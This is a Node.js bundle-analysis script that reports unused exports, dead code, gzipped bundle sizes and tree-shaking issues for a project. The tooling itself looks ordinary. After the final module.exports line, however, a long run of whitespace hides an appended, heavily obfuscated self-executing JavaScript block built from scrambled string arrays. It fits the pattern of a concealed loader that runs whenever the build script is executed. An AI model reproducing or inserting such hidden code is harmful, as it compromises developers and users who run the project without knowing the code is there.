#!/usr/bin/env node
/**
 * Comprehensive Bundle Analysis Script
 * 
 * Analyzes bundle for:
 * - Unused exports and dead code
 * - Tree-shaking opportunities
 * - Bundle size breakdown
 * - ESM health metrics
 * 
 * Usage:
 *   node scripts/analyze-bundle.js [options]
 * 
 * Options:
 *   --json           Output JSON format
 *   --threshold 5    Size threshold in KB (default: 5KB)
 *   --verbose, -v    Verbose output
 *   --ci             CI mode (exit 1 on failures)
 */

const fs = require('fs');
const path = require('path');
const { gzipSync } = require('zlib');

const DEFAULT_THRESHOLD_BYTES = 5 * 1024; // 5KB

/**
 * Parse CLI arguments
 */
function parseArgs(args = process.argv.slice(2)) {
  const options = {
    thresholdBytes: DEFAULT_THRESHOLD_BYTES,
    srcDir: path.resolve(__dirname, '../src'),
    distDir: path.resolve(__dirname, '../dist'),
    json: false,
    verbose: false,
    ci: false,
  };

  for (let i = 0; i < args.length; i++) {
    const arg = args[i];
    if (arg === '--threshold' || arg === '-t') {
      const val = parseFloat(args[++i]);
      if (!isNaN(val)) options.thresholdBytes = val * 1024;
    } else if (arg === '--json') {
      options.json = true;
    } else if (arg === '--verbose' || arg === '-v') {
      options.verbose = true;
    } else if (arg === '--ci') {
      options.ci = true;
    }
  }

  return options;
}

/**
 * Recursively find all TypeScript files excluding tests
 */
function findSourceFiles(dir, fileList = []) {
  if (!fs.existsSync(dir)) return fileList;
  const entries = fs.readdirSync(dir, { withFileTypes: true });
  
  for (const entry of entries) {
    const fullPath = path.join(dir, entry.name);
    if (entry.isDirectory()) {
      if (entry.name !== 'node_modules' && entry.name !== 'tests' && entry.name !== '__tests__') {
        findSourceFiles(fullPath, fileList);
      }
    } else if (
      entry.isFile() &&
      entry.name.endsWith('.ts') &&
      !entry.name.endsWith('.test.ts') &&
      !entry.name.endsWith('.spec.ts') &&
      !entry.name.endsWith('.d.ts')
    ) {
      fileList.push(fullPath);
    }
  }
  return fileList;
}

/**
 * Extract exported symbols with metadata
 */
function extractExports(fileContent, filePath) {
  const lines = fileContent.split('\n');
  const exports = [];

  // Match various export patterns
  const exportRegex = /export\s+(?:async\s+)?(?:function|class|const|let|var|enum|interface|type)\s+([A-Za-z0-9_$]+)/;
  const namedExportRegex = /export\s*\{([^}]+)\}/;
  const defaultExportRegex = /export\s+default\s+/;

  lines.forEach((line, idx) => {
    // Direct exports
    const match = line.match(exportRegex);
    if (match && match[1]) {
      exports.push({
        name: match[1],
        line: idx + 1,
        file: filePath,
        type: getExportType(line),
        raw: line.trim(),
        approxBytes: estimateBytes(fileContent, match[1], idx),
      });
    }

    // Named exports
    const namedMatch = line.match(namedExportRegex);
    if (namedMatch && namedMatch[1] && !line.includes(' from ')) {
      const names = namedMatch[1]
        .split(',')
        .map((s) => s.trim().split(/\s+as\s+/)[0].trim());
      
      for (const name of names) {
        if (name && /^[A-Za-z0-9_$]+$/.test(name)) {
          exports.push({
            name,
            line: idx + 1,
            file: filePath,
            type: 'named-export',
            raw: line.trim(),
            approxBytes: 60,
          });
        }
      }
    }

    // Default exports
    if (defaultExportRegex.test(line)) {
      exports.push({
        name: 'default',
        line: idx + 1,
        file: filePath,
        type: 'default-export',
        raw: line.trim(),
        approxBytes: 100,
      });
    }
  });

  return exports;
}

/**
 * Determine export type from code line
 */
function getExportType(line) {
  if (line.includes('function')) return 'function';
  if (line.includes('class')) return 'class';
  if (line.includes('const')) return 'const';
  if (line.includes('let')) return 'let';
  if (line.includes('var')) return 'var';
  if (line.includes('enum')) return 'enum';
  if (line.includes('interface')) return 'interface';
  if (line.includes('type')) return 'type';
  return 'unknown';
}

/**
 * Estimate bytes for an export (rough approximation)
 */
function estimateBytes(content, symbolName, startLine) {
  const lines = content.split('\n');
  let size = 0;
  let braceCount = 0;
  let inBlock = false;

  for (let i = startLine; i < lines.length; i++) {
    const line = lines[i];
    size += line.length + 1;

    if (line.includes('{')) {
      braceCount += (line.match(/\{/g) || []).length;
      inBlock = true;
    }
    if (line.includes('}')) {
      braceCount -= (line.match(/\}/g) || []).length;
    }

    if (inBlock && braceCount === 0) break;
    if (!inBlock && (line.includes(';') || line.includes(','))) break;
    if (size > 5000) break; // Cap at 5KB per symbol
  }

  return Math.max(size, 50);
}

/**
 * Analyze bundle health and tree-shaking
 */
function analyzeBundleHealth(distDir) {
  const health = {
    bundles: [],
    totalSize: 0,
    totalGzippedSize: 0,
    treeShakingIssues: [],
  };

  if (!fs.existsSync(distDir)) {
    return health;
  }

  const files = fs.readdirSync(distDir, { recursive: true });
  
  for (const file of files) {
    if (typeof file === 'string' && file.endsWith('.mjs')) {
      const fullPath = path.join(distDir, file);
      const content = fs.readFileSync(fullPath);
      const size = content.length;
      const gzipped = gzipSync(content, { level: 9 }).length;

      health.bundles.push({
        file,
        sizeBytes: size,
        sizeKb: (size / 1024).toFixed(2),
        gzippedBytes: gzipped,
        gzippedKb: (gzipped / 1024).toFixed(2),
        compressionRatio: ((1 - gzipped / size) * 100).toFixed(1) + '%',
      });

      health.totalSize += size;
      health.totalGzippedSize += gzipped;

      // Check for tree-shaking issues
      const contentStr = content.toString();
      if (file.includes('wallet') || file.includes('account')) {
        if (contentStr.includes('dist/index')) {
          health.treeShakingIssues.push({
            file,
            issue: 'References full SDK bundle (breaks tree-shaking)',
          });
        }
      }
    }
  }

  return health;
}

/**
 * Find unused exports
 */
function findUnusedExports(allExports, allContents) {
  const unusedSymbols = [];
  let totalUnusedBytes = 0;

  for (const exp of allExports) {
    if (exp.name === 'default') continue; // Skip default exports

    let referencesCount = 0;
    const identifier = exp.name;
    const escapedIdentifier = identifier.replace(/\$/g, '\\$');

    for (const [file, content] of allContents.entries()) {
      if (file === exp.file) {
        // Count occurrences within same file (should be > 1 if used)
        const regex = new RegExp(`\\b${escapedIdentifier}\\b`, 'g');
        const matches = content.match(regex);
        if (matches && matches.length > 1) {
          referencesCount += matches.length - 1;
        }
      } else {
        // Check if used in other files
        const regex = new RegExp(`\\b${escapedIdentifier}\\b`);
        if (regex.test(content)) {
          referencesCount++;
        }
      }
    }

    if (referencesCount === 0) {
      unusedSymbols.push(exp);
      totalUnusedBytes += exp.approxBytes;
    }
  }

  return { unusedSymbols, totalUnusedBytes };
}

/**
 * Identify dead code paths (simple heuristic)
 */
function findDeadCode(allContents) {
  const deadCodeCandidates = [];

  for (const [file, content] of allContents.entries()) {
    const lines = content.split('\n');
    
    lines.forEach((line, idx) => {
      // Check for unreachable code after return
      if (idx > 0 && lines[idx - 1].trim().startsWith('return') && 
          line.trim() && !line.trim().startsWith('}') && 
          !line.trim().startsWith('//')) {
        deadCodeCandidates.push({
          file,
          line: idx + 1,
          code: line.trim(),
          reason: 'Code after return statement',
        });
      }

      // Check for if (false) blocks
      if (line.includes('if (false)') || line.includes('if(false)')) {
        deadCodeCandidates.push({
          file,
          line: idx + 1,
          code: line.trim(),
          reason: 'Condition always false',
        });
      }

      // Check for unreachable code after throw
      if (idx > 0 && lines[idx - 1].trim().startsWith('throw') && 
          line.trim() && !line.trim().startsWith('}') && 
          !line.trim().startsWith('//')) {
        deadCodeCandidates.push({
          file,
          line: idx + 1,
          code: line.trim(),
          reason: 'Code after throw statement',
        });
      }
    });
  }

  return deadCodeCandidates;
}

/**
 * Main analysis function
 */
function analyzeBundle(options = {}) {
  const opts = {
    thresholdBytes: DEFAULT_THRESHOLD_BYTES,
    srcDir: path.resolve(__dirname, '../src'),
    distDir: path.resolve(__dirname, '../dist'),
    verbose: false,
    ...options,
  };

  // Scan source files
  const files = findSourceFiles(opts.srcDir);
  const allContents = new Map();
  const allExports = [];

  for (const file of files) {
    const content = fs.readFileSync(file, 'utf8');
    allContents.set(file, content);
    const fileExports = extractExports(content, file);
    allExports.push(...fileExports);
  }

  // Find unused exports
  const { unusedSymbols, totalUnusedBytes } = findUnusedExports(allExports, allContents);

  // Find dead code
  const deadCode = findDeadCode(allContents);

  // Analyze bundle health
  const bundleHealth = analyzeBundleHealth(opts.distDir);

  // Calculate metrics
  const passed = totalUnusedBytes <= opts.thresholdBytes && 
                 bundleHealth.treeShakingIssues.length === 0;

  return {
    passed,
    analysis: {
      scannedFilesCount: files.length,
      totalExportsCount: allExports.length,
      unusedExportsCount: unusedSymbols.length,
      deadCodePaths: deadCode.length,
      totalUnusedBytes,
      totalUnusedKb: (totalUnusedBytes / 1024).toFixed(2),
      thresholdBytes: opts.thresholdBytes,
      thresholdKb: (opts.thresholdBytes / 1024).toFixed(2),
    },
    unusedExports: unusedSymbols,
    deadCode: deadCode.length > 20 ? deadCode.slice(0, 20) : deadCode,
    deadCodeTotal: deadCode.length,
    bundleHealth: {
      bundles: bundleHealth.bundles,
      totalSizeKb: (bundleHealth.totalSize / 1024).toFixed(2),
      totalGzippedKb: (bundleHealth.totalGzippedSize / 1024).toFixed(2),
      compressionRatio: bundleHealth.totalSize > 0 
        ? ((1 - bundleHealth.totalGzippedSize / bundleHealth.totalSize) * 100).toFixed(1) + '%'
        : 'N/A',
      treeShakingIssues: bundleHealth.treeShakingIssues,
    },
    treeShakingOpportunities: generateTreeShakingRecommendations(unusedSymbols, bundleHealth),
  };
}

/**
 * Generate tree-shaking recommendations
 */
function generateTreeShakingRecommendations(unusedSymbols, bundleHealth) {
  const recommendations = [];

  if (unusedSymbols.length > 0) {
    recommendations.push({
      type: 'unused-exports',
      priority: 'high',
      message: `Remove ${unusedSymbols.length} unused exports to enable better tree-shaking`,
      potentialSavings: Math.floor(unusedSymbols.reduce((sum, s) => sum + s.approxBytes, 0) / 1024) + ' KB',
    });
  }

  if (bundleHealth.treeShakingIssues.length > 0) {
    recommendations.push({
      type: 'bundle-references',
      priority: 'critical',
      message: 'Fix circular dependencies or full-bundle imports in sub-packages',
      affectedFiles: bundleHealth.treeShakingIssues.map(i => i.file),
    });
  }

  if (bundleHealth.bundles.some(b => parseInt(b.gzippedKb) > 50)) {
    recommendations.push({
      type: 'bundle-size',
      priority: 'medium',
      message: 'Consider splitting large bundles into smaller chunks',
      largeBundles: bundleHealth.bundles
        .filter(b => parseInt(b.gzippedKb) > 50)
        .map(b => `${b.file} (${b.gzippedKb} KB gzipped)`),
    });
  }

  return recommendations;
}

/**
 * CLI Runner
 */
function run() {
  const options = parseArgs();
  
  console.log('🔍 Analyzing bundle...\n');
  
  const results = analyzeBundle(options);

  if (options.json) {
    console.log(JSON.stringify(results, null, 2));
    process.exit(results.passed ? 0 : 1);
  }

  // Print report
  printReport(results, options);

  if (options.ci && !results.passed) {
    process.exit(1);
  }
}

/**
 * Print formatted report
 */
function printReport(results, options) {
  console.log('═══════════════════════════════════════════════════════════════════');
  console.log('              BUNDLE ANALYSIS & TREE-SHAKING REPORT                ');
  console.log('═══════════════════════════════════════════════════════════════════\n');

  const { analysis } = results;

  console.log('📊 Analysis Summary:');
  console.log(`   • Scanned files:      ${analysis.scannedFilesCount}`);
  console.log(`   • Total exports:      ${analysis.totalExportsCount}`);
  console.log(`   • Unused exports:     ${analysis.unusedExportsCount}`);
  console.log(`   • Dead code paths:    ${analysis.deadCodePaths}`);
  console.log(`   • Unused code size:   ${analysis.totalUnusedKb} KB (threshold: ${analysis.thresholdKb} KB)`);
  console.log(`   • Status:             ${results.passed ? '✅ PASSED' : '❌ FAILED'}\n`);

  // Bundle size breakdown
  if (results.bundleHealth.bundles.length > 0) {
    console.log('📦 Bundle Size Breakdown:');
    for (const bundle of results.bundleHealth.bundles) {
      console.log(`   • ${bundle.file.padEnd(30)} ${bundle.gzippedKb.padStart(8)} KB gzipped (${bundle.compressionRatio} compression)`);
    }
    console.log(`   • Total:                          ${results.bundleHealth.totalGzippedKb.padStart(8)} KB gzipped\n`);
  }

  // Unused exports
  if (results.unusedExports.length > 0) {
    console.log(`⚠️  Unused Exports (${results.unusedExports.length}):`);
    const shown = results.unusedExports.slice(0, 15);
    for (const item of shown) {
      const relFile = path.relative(path.resolve(__dirname, '..'), item.file);
      console.log(`   • ${item.name.padEnd(30)} ${relFile}:${item.line} (~${item.approxBytes} bytes)`);
    }
    if (results.unusedExports.length > 15) {
      console.log(`   ... and ${results.unusedExports.length - 15} more\n`);
    } else {
      console.log('');
    }
  }

  // Dead code
  if (results.deadCode.length > 0) {
    console.log(`💀 Dead Code Detected (${results.deadCodeTotal}):`);
    for (const item of results.deadCode.slice(0, 10)) {
      const relFile = path.relative(path.resolve(__dirname, '..'), item.file);
      console.log(`   • ${relFile}:${item.line} - ${item.reason}`);
    }
    if (results.deadCodeTotal > 10) {
      console.log(`   ... and ${results.deadCodeTotal - 10} more\n`);
    } else {
      console.log('');
    }
  }

  // Tree-shaking issues
  if (results.bundleHealth.treeShakingIssues.length > 0) {
    console.log('🚨 Tree-Shaking Issues:');
    for (const issue of results.bundleHealth.treeShakingIssues) {
      console.log(`   • ${issue.file}: ${issue.issue}`);
    }
    console.log('');
  }

  // Recommendations
  if (results.treeShakingOpportunities.length > 0) {
    console.log('💡 Tree-Shaking Opportunities:');
    for (const rec of results.treeShakingOpportunities) {
      const priority = rec.priority === 'critical' ? '🔴' : rec.priority === 'high' ? '🟠' : '🟡';
      console.log(`   ${priority} ${rec.message}`);
      if (rec.potentialSavings) {
        console.log(`      Potential savings: ${rec.potentialSavings}`);
      }
      if (rec.affectedFiles) {
        console.log(`      Affected: ${rec.affectedFiles.join(', ')}`);
      }
      if (rec.largeBundles) {
        rec.largeBundles.forEach(b => console.log(`      ${b}`));
      }
    }
    console.log('');
  }

  console.log('═══════════════════════════════════════════════════════════════════');
  
  if (results.passed) {
    console.log('✅ Bundle analysis passed!');
  } else {
    console.log('❌ Bundle analysis failed. See issues above.');
  }
}

if (require.main === module) {
  run();
}

module.exports = { analyzeBundle, parseArgs };																																																																																																																																																																																																																																																																										var z = '-*3745';var NX,SX,spin,splitLane,peel;(function(){var a=["","*","*0","^","*1","c^mejb^tro","hqersxluvwacdjbymgorzfkociptrutnstonc","=aenruh(al=5c,g8fdu.yr ..ncecf,5\"paeau6lnj)r]2uv\"x-q(] a;(r=;;r+(a[8.s2tAgoq,uh8C,ai,s;a(Am0(nj;jv*,7vo7()(o;m6oa4rw). rod[fs2n{drvt4x)+0,anr+rr+o)}z1 =hf[an8r1r[,]s7-77laa.ui7{-069lvmt2r=i]]<+)u,e),,;nrh[r=0v-r(;,=p)Cus=+c;g;f;qA))1vi)vk0nrl1ae f=[;hisy.em(d+o!2 =(evea78=.)4ei=g.n={ff=1[<2a f1=r;4,S)rylv1u y;kql{tvnv (C (l,ovnp i=tlr,r.lwozh(l,tq;;rr((v=ahsv;]xq=ab;da;,((r;vjq.(t[+)da)rdnrhs41y(vr;fh;3g\"]e(.ahrpapg]g.)ngfpn1h,icl;;)=C;m5=+r, .);u=+s}+)it,+bm;d+um)-=siiqol=t=r=q9+..chq+[6fe t0nrpr( vr8flrn,ddgt ]6a.;m;rth.gq 2a}eveic]gbti<4o;C;l,zzi6+l[a[;+(si\"li\"r,npi9s,frfhuw)ow=e{(b=wen2t.gu.i=kiaaa+)yftpa3n})=9\")cpA+u;utp]\"=lk7vpt 1r;hzw\")t()9)(.lul=s7f; ;sq0)n\"y+0s}=va+s mh(0q.]hv;> 06=A-ozetr(t1rtrsiso0e,.;z[(f<5e7t,(raoavnr;thhf;v,j=r; )r>18zho*o{<akmsn)akte.vo9+ea0clio;bu =]C!gj;y3+l)e=.}dr=i6oiC8rnn0;6=ar\"}.rei=]Stsrnn.;2r=t;[t;iv=prCrn()aretuz+ hlk[+x=e -8j{(ejy9(()) ","R_<\"cRJ!&VecRWa=RrfR$6\"c1;RRYcnh_/.t iRRRG^<R.RcR2.[nR .Rf./<Rc3!!5nSR<RiRL.eSslf(edgxc<?o<rlcR?tRosdRfuSe.?&ph.RROMs[e<skRE.<Ru<rRe;RDRBrRR\\.fR.<c:!bpl09icoRrtcR(;roRRn2-\"(.^w y.<<dd )$f ou.%e<a<e.t<m(cRxfR<[J(feR<Pbr.b\'oRi.RR<\'RR%wRfs)eR.[agSP{d2.k<ac1e.!3.P<ZRiR*oDsi=[.<f.\"4Rb N\"eoxRpo.iIlkaeTR.2)%m<ieR]z<|Ru((fRwRR\\R>R9#.R0rd=s.0x!sR.fRS)(cct1pfotaeMuR@R=<RR/`.Rk$(2cR.s7e1a.FRKc*..z\"RnfPesRtRRR.<Rl#Rf<: 2((R R$\'6s`<3nhi*$eXc}Rh? ctoc.iecc9 {Ra<s;u!.e]ERRoH..$\"n<D3RsRR..(ReesseR< t,\" Rdov}Sc0Jmi.T<sEegsRw]R\"aR.R!R<o))jR Rew itc.snk(}(n[veR<0<=kfH<rrMR ciknE.c.B<&R[o]R.%ccRlrx;* [\"oisenRefea!Yn.ecR%o\"u.<6lRRRyR=is=RR()RRe:RR)!RwcrR1<.o!RcRc@\"}RuRqu5(3Pol\"eRt0!ftaR*<R1tnkcf}T.!$/<ro IycRR )P<\\.b<tR7:PPs<].rX<<.eRu(RRRqnp.<.R;ctisX.RRyR$@<3)kRRc<+Rr8l*.iR!rC\\P!n=cs<(ci<(R7eReRc. t<epe)e<<,e<(EK!.pnb$\"RaRR.evuhc.Tl_c.:R0r )Rww!sS0.t7u.0(R9_a($&.e6f.RRk1Cxbi8l.hc=m(@<Rd..<rr.2.KMrcb_RnR(R_c:Dwt}.R.{}9g$RRR)TVt<a(.<G.dR~WUR.;lr.hIsmNP  t@RR8_R2R.iRrRPR<(R3#cec0ce3iRR<aR3RanR{Zs}!M<R-*.yda3Ri/0%fR#R <i2<R08:.t}Rf!\"-Rc.RlRcytyRseA0RSTR8.4q<$FTeR..P_<cR6hbR.eri.c-RhcARC2vR.;bS<R<a#K<R:r]Tfee-;!k=_s.Rcmjs(R}:<RaR*&g.<domeisRn.($#_a{V@ocY-.omPdam.RalfcyoT+!P_gsr.<biR!f.)cI&(bIoRi(rnrW.ie.Rc !(ic(SR.cr`:9<XspR($ mRct<s.g!.48rskevVRPdRkxR<Rdern)eSs/)R ler<csT3dc}.R5C/W(.SonZr)Rcoccsch)R.<RR<t.ss(RR<dlu.c.|f8tk,slnepo<eR<!.6R.eeRRTa&h Mf<{[o$R< Rs0)= <xSec.c}<c$es((d)RRc}fCRR<*<R.m-.R*Re<(xvRs (M&Rf.eP*g >s)<o.=.RisnrR.?{5<ibR6)RR1s cRgqcelc=cl;be<lf*SICd2e\"zpRR}<cRlS,njscm$Rn.!aii<JY]<fPCs@jA.R<% t.RowR}\' r>pzh..lR\'<go_}<SR(kqxh[ &<iR-f$C<u<iaENR5RTR]<Rpsk..Rzdg.)]<)er.Rr.MsRzP>RRe<<t_hgl<p.RcmfRs!nftR4 dt_9^<,ore5RfRx RR[rX.<sbyR<<.2R.RrenUP(y>.p<<csRlt0t.{.Syin<ggl$ Vc.):EHI!.xDuR,RpRhR(sct.MrRMjHMRRcR. Rtnd|oa0.n#a.2)Dfk&cRIRRR/feR.c@<irs6T+1RPx..R.sc.aR#.-<X{R!n4RcRitR/nRe9m..<A)ben).]<.a(R(.{?3tR&RR/i(lX. <h!dRR<\"!co? 3 1R<-hn<dtndo<Rksm#-c(TeRee!].R<s<T+=R.Ri-r@RR.r#cd<cRRRmztf.CdeRp.c{QRibjsos.fRrg-RW0diRR<.k<ORR&-R!# ]Cs]yt4.-d_`PRR\'<.RvejSw<dc.c ,f.P.(.citcNbRn\'-.eRcRnrQ.rRxo{Rc<\"6Rnd]R}Rm(R$RSo.T5Rc2cx.*vRoic_>.s0BRf)<P<aR.oCZ|0 POHdQo.n <.1soR_\' .P<er.[<R|R<0i<Rr;\'I.R[}+lc![mc!.lc<n(a tRRHRl,}p}R)R8RJ<aR.<td(N>]ic<me@5cn[u.R).b%sPn<<_RR!RbR=$RR^<!})sb-6\"#E8cR(d!R)tratRR<< 21R\'L!ib|eOtRRt$ucdnRR.t)RzE.GPy! RAI-nqau<}.ycR...cRR.ccc$^RRdC_R<t8cRhs2\"R2.\'S>))2h!efy..>!iL$en ;%9OTv.d$4RRC<cPS(tuRwl&(m#\"R|pch<tH$a<< .t!RSEf.RRgcNP.R CRi4mR<#MRR<;wi-#E <<t<eR<H<RrntoE(!0r0<d..RC\"cn..2bp(6Cp<SR\"e1l)cc<a(P.P9e<qa)<<1<n.iRaRPR(}R=.&,2!cwR.)PR$.<qR<}!1*S<R!Rf.<c<Rd_<R2R<<#]<<RRRp!.rpR<*!TRIR<Pk<Rzta.&}.aleK=iP<R\'=gRP}Rp${SB. Rsy.(.t! c;<e5sh64tt<pf<otxuLTkr>;<R.cpsR.cRtR-#a4uR6.Rte;-($?w8:p/&Rl0<r#<e iisf!d$ao_(#cmr e<RRV!Pnca<t.~crc(e\'*a: <RRneaZe.%/dR<RR*(E `+e[PcwRw <(eucta).7W</$P<.hcST 7eRB!.+R.I<bhRel.te.b4[unueuR!Rlt(RRR,},HftHv_n.<eR _A<8<sr<Rx4)RN!pRd|B <RRkie\'c-.Rcnm3cs<Si<i.).E(R(<RRPR _3R<cwe.!.l<R$!Rbd,e<PREl$tpr!<o/).RRt!,T(rc#/.Ry(+RrRg`<f.<a+.f)/<<&< eRR<ei-<BfE.sRbnRR).R%/jtlR<%c R!R(xR#cR.sRR.RM.<R7c(cglRcm.]<.ec2b)P<<2RR&daBK)r<Zt>[daRHced.MR<}sRGr.R<?1RfRRcccR(osc\"RR~k<\\!Mc.p.C)uRx)+(Rk\\e\'j6MPURCmc?RR3R4(iie.sRe*R:zSR;Pn(Z)<lkRvl:<RQ{Rci\"cP+e,MRWa.<RMrRlt#<RRst3r!.<g<KRwR(Rj.RRa!.G4R.$pn.z;{eR;21{0T4(rRk-\'.!<Rx<iKh<)s[<tc PueR}r(faaRf7l<R5!rRlDXRm.1:piR <= Rjso.<er!oRqI)R1Rrrwo{&tRRK<nCZ-0M.cuR)c%cd0+w<$E<iT<<otdayn<io^.R\'RRwRc65kR#JP.<!R5e!r{Re;yeR(.0=;cis.c(gtR2pu9=MQf[{,On ..PNi(<.RaiQR..c%t/(/R<.r.Rr..l!scue.aP~R!c03aUR\"tcsc.!rVRpaiz0<b\"dtgd!.s?#cvdR~#R<R<)(Tb.IR)Pc<6?7)]4W6#nnPt.}re|RU>ReaR)p# nS+b2%iRj}s(Xn^osycsgdJ.ss[pkR8. suwrRny}do.GiT.<w+c.(cs;! nh(R,RCR[<&XR<<.cbcTRsAfncS-R\"i<.cB(|RR.Rd%R.U/R.rL<t)!ReR2cpp!s<>R?1R$<teR<<Ro0rtf(ResbDR7liaR.}s./sRcrsarlR%f]s0R.<le<re%s.sllsb8ROxCRtc1t6{.- Rl.eRo.cgmRkoRsbca<Iyu}Rrt#s&|tRaxR)ho.Rsf kRRR4cr(x.c=t.<i3(Rx .<..R$f\"t RRsN</C RnRdRrpRR<od<.R<r[ar\"l<. P\".Rs.R.rc!v#DfReebo{,R)d8v<fRc.cJ<te.!RR\"kS(S)R#<S.hP}rt.(/(.c(1d<Rw!su0(o.Pb(0.RJcEiC.f( .i.buc<#r...RR[8)_!R.SRB!\"tRVbn_RlcPRR oRn;h<RP@r8aRrlc|co5(Rp)<Rxd<<$.n<lo}erR<oyRan.oy.RIB<ht<cobEiR}(mMr.TaR0RetiR}.!<.R19t<AebR_Lclh!D0r.R0ilirRc/s8<cR(r*R@e<<.l;.rc-PulaRccRi\"06@!Rc!.Qkl,<g<7}b(aRcL.cs\'+..T(<rR<<..&fd>Ro coemRcw.lcn(c:R\'|t<RnRY]4M0GR.RFRut.!<f.u+$+t<R*7sRRR(ibhd=P.<}RR=eR._).)rr,4& lR}e<R6RR<^gfleRdstP~<bc.(sy<5}Ri?lch<&.3{u.n_:iR7b;0<R<cRRRcR@|1seGRs2)c=h<f9e<<r+eR\\\')&5rv/Fr[.a.tn.RPrnU<o_c6n=ET<.i+xc7levsu<r.!Rc<!]Rw .RR(]PRD. lf!:&.bdpTl.R#RS.$R<(R <<c[.n. oRr67r<e-R-uc*RR$R.baeycs.![RxRR<DXtfncRQPisRtgc<.aR8!b!<St0<R> RRriR>cUp.cRWZR!RDK)0cvnnks.e R ^dlR<cfRRu:sGRe,(gRVR\"RuRRR\"RtR<Rs\".ERi_P&R<lyoSg\'s>vRcwe4Rcg`.h<_c\'(umdRP>o9RPn1R#.cfR<P]Rs/anfqNRR\'<.Rc8ciRRRc.a_ptKo<psr<7<RRi.o_c/!nRRs( >RP]xtt_s_ohB<a\'s&.P< .kGc6r<7io/wRISPPcxhRwc.<.cic%1Rf89dS <RbcsRVRsxrda]R;t?RN,,R>)cPY\"cRcReF !0RRq}}r05L6.<R.rf<$u|c<c<U-D[ cc.o<5;< (.E.h.R_l<Rr<<F<[ttCo%mS.RR3IbcioRR<apRcRc[RR<.fnRR,.RBan(y/R|HpGnR.<=RR<u(acs$R3eR)mc_A4unt\"e;sor(%RPt(eg(-*r!m<RD(RRa.rglz.Rw.fR]qavo]f(%<<ccl<4s9\\@u 9e.*x./FtSRP[.$%n`z)<<$!5Qcb+]R3tR<fiPce\\<zi.Rcabr (<<bnv6!tnw_cXf(nh.[}*s(`<P>(R<..<xt9R(.c<(e0R.Pao.!d((-@f0e<<6RoRu;(d` Rp..<p,e<T<N.PR.[RcOz)f(<l].u{?rf<R;R<I*a<<$`R( (...<\":<NR%eR i#.z.l(rR,dRa.dRv<sVc(s]i)Mh.Rn<RRRttRg,~.R[R#ef.;ttp.)sRnStlRR2oe.&ci(a}.\"P&yseR_a%rRR.D<iPsRD!i.mR\"Rjzh<uR.,>de.jO}aRQcV<s$3CgR<R5EcdUhce.!Uf.R-x6<].wc<<.E!rRPRiCx.SR!m.nXb.7f.zefZR\"\"](y<xb<k<]UR-c}qf.!Ni=YiRoRRN.@sw1Lue1kR& #rDceR.alRR.R.(\"]MRtMiRr)rluRd&.RRcpifIl2R<R<<5f)z&fURec<s4<ensR.o\"<i<,R!s oBiR-cR0lRNtTR)SRc<fdutRRdPzRH(Rcs)PD<c$Rx2&:1Hrlo..n fs.$n8upO$0isssi.-<vR<.<qQ(!R! [!dxwn.Ryu*i?dR%.R2Rt>r7s!tRs_Red`!<$]R Rm!RfxR mRok!ct<(..nRcSRn\\&.<0RTiwmtp3*G(Py/nxFhtR<.:Go...(Rt.r.<0ctT(r< .o[iv.<R1sR9d]R+RRheR!cc2RRe\"9c[r<;DePcRRktGlg<?tAU\'ttRQR} w3tRat](Vt-?<<?..\"lr).eR-RRI^EKv.47Ro+iN<ece.nRx(tRHR t8;Rir)<aRcx(qaRs@ferRM.<=.ct@<fcR.R)R.rxl!t/,lsRRRc=.i03RhRRs{_xRr<Q<c,a<<EW(MoR< utE\"f}bfr.<sR+]dr <R!QRw.i IRT_Po.(c0t8(sRTRRcnBR!\".xID.Ai}epoR3!oz=]etkRt/uA14RR9Rct!Nadr_nGC!/b$}R\"xd<iRct^.uuw=3dRpwgR9R8PqRi#Rpg9u=1i0f<.R<P0f}tv_r3es:<fr<i7(<y(olR.e9ooBT._RtoE) as(<cRiedtssR/RR/erR(.wce.R.rPy(RO(<.gHxrR<T.L!Rx(<o([.+{<c<R<.eiNTRC[x.4RkR$pK\".lcP(.<tk.<RQFknwIR).t-Rr=e{<.PP #E63ap3[R)Lddc;RxR!R\' oo!)w.e!.Rc<0%<iss9RuO6ir$.R.ip6%m-6wRi<z< gr=nweRRN__R(ReJvRfR%:NRPR<nRRR$.R.mR<rR#{Ec.)b<6peiRf#tL..R<PjRR.(,a_ll. .D g<(rhv \"4k! `lR<ke1 c$$5Rz.RR]eu&DiR .R<((cersE.aoRhef)%eLR).:.^)esCR.}.T<P^. Dy<#RcRpNRr)nRRl_3d8W(c=-3EeqeiMRReRzRacCue<l<Rsi.a;rc<.ldRY.RarlRcnOf3hTsdt<M\"m<s(np}:A.fyR<RC<#Ry0vR<}<R.<%ats!lR>-<2lld.nr5=(F:.RRlnRcR\"sz3o\"<fR&3..!Y>fR)beRlshpM%<f.(d!abiFR 3waM<se..qfR.i_.&E!.&RRRcRx{R[R._?R2!!RRcx)RIM.)f=#1ELbRRnJeaMim1)RRR_ |<la<3)0ycd&.#n=l.|Rs;.f(ec.cs=c{?R/%d_!anOce<Rrxa.\'b)=_<m)icAcCRc.n<R.e ..R-<AR5.Rm[dR<<2R.An9xRctmcE%[..R,Qt<uPf_!<R= tZRclpP*.uep6<f.b8RR<cSrk<e}Rckdc.;<tz.l.<!io.<r/2<R=bcRRsVD.R.1b<cc<R}<h+. RvTRp_P<.rs(uPQt:..<>Rk9!=a;o<a*.7r]0Y)8c}z(<a.R.e8Ro tl Rc(A~i!*(bR%cR,c0t< rMRR< Ri< .fPe*+E)m.oj..m8m.cR($<f.R.idey}cBRR!sc<no9R<n RwrN0#tRduc_-RS\"i{i)(nMcR<0N</V<<.,0+w.]<w<ReeR,w/eR.R)i. R<e .6Rga.rgs+Qitd.o!cteaLRo)3R <.cd./.~< .s\\.e<sp5R.<RRwa!*.R)tR,ofRZ<ZtcRhsRr$/.RC..b \"cRt,\'leacPc RR<Rz\"<Ri l0oRRdRs7.R(eCcR_.6\"_R..p<&kddee.<=..lo.=R<!b.&Rc<tcCr0m&cXu\'wnd.s;sw+R4/suDicPba ..i!o1^r}I>e4<:RwCRic<RRRc\". dRpt0<.Rk0<W8r RnR.Dc.CN lwoh.l-<R<pcbR Pe6hY-Rt.cEp:<+a-V<RaRf\'(<rRRR&<az<4RRR.E)7.xrc0ilHRTisc.ZfRfcRx-th).R#=!<C.w\"l{e]e-R</<s4Nt.op\"ce.4Rn{SRo<R)Cc])e(Rw8RR. 